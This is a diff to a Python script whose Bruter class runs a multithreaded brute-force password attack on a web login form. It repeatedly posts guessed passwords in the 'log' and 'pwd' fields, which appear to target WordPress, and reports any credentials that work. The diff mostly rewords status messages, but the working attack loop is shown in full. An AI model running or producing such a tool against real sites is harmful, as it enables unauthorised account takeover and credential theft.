@@ -44,7 +44,8 @@ class Bruter:
         self.username = username
         self.url = url
         self.found = False
-        print("Finished setting up for: %s" % username)
+        print(f'\nBrute Force Attack beginning on {url}.\n')
+        print("Finished the setup where username = %s\n" % username)
 
     def run_bruteforce(self, passwords):
         for _ in range(10):
@@ -52,28 +53,29 @@ class Bruter:
             t.start()
 
     def web_bruter(self, passwords):
-      session = requests.Session()
-      while len(passwords):
+        session = requests.Session()
+        while True:
             time.sleep(5)
             try:
                 brute = passwords.popleft()
             except IndexError:
-                print('Quit with no match.')
+                print('Thread quits with no match.')
                 sys.exit()
+            print(f'Trying username/password {self.username}/{brute:<10}')
+
             resp0 = session.get(self.url)
             params = get_params(resp0.content)
-            print(f'Trying: {self.username} : {brute} ({len(passwords)} left)')
             params['log'] = self.username
             params['pwd'] = brute
-            
+
             resp1 = session.post(self.url, data=params)
             if SUCCESS in resp1.content.decode():
                 self.found = True
-                print("[*] Bruteforce successful.")
-                print("[*] Username: %s" % self.username)
-                print("[*] Password: %s" % brute)
+                print(f"\nBruteforcing successful.")
+                print("Username is %s" % self.username)
+                print("Password is %s\n" % brute)
                 passwords.clear()
-                print('done')
+                print('done: now cleaning up.')
                 
 
 if __name__ == '__main__':
